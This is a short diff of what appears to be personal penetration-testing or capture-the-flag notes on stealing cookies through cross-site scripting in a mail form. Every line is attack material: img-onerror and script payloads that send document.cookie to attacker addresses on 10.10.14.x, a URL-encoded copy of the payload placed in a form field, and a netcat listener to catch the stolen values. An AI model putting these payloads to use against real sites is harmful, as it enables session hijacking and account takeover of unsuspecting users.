@@ -1,3 +1,10 @@
 GET COOKIE e.g. FORM Mail - burp
-<img src=x onerror=fetch('http://10.10.14.179'+document.cookie);>
+<img src=x onerror=fetch('http://10.10.14.179:4444/'+document.cookie);>
 <script>var i=new Image(); i.src="http://10.10.14.123:8000/?cookie="+btoa(document.cookie);</script>
+
+examle url encoded
+service=<img+src%3dx+onerror%3dfetch('http%3a//10.10.14.179%3a4444/'%2bdocument.cookie)%3b>&email=afaf%40wp.pl
+
+
+nc -lvnp 4444
+ 
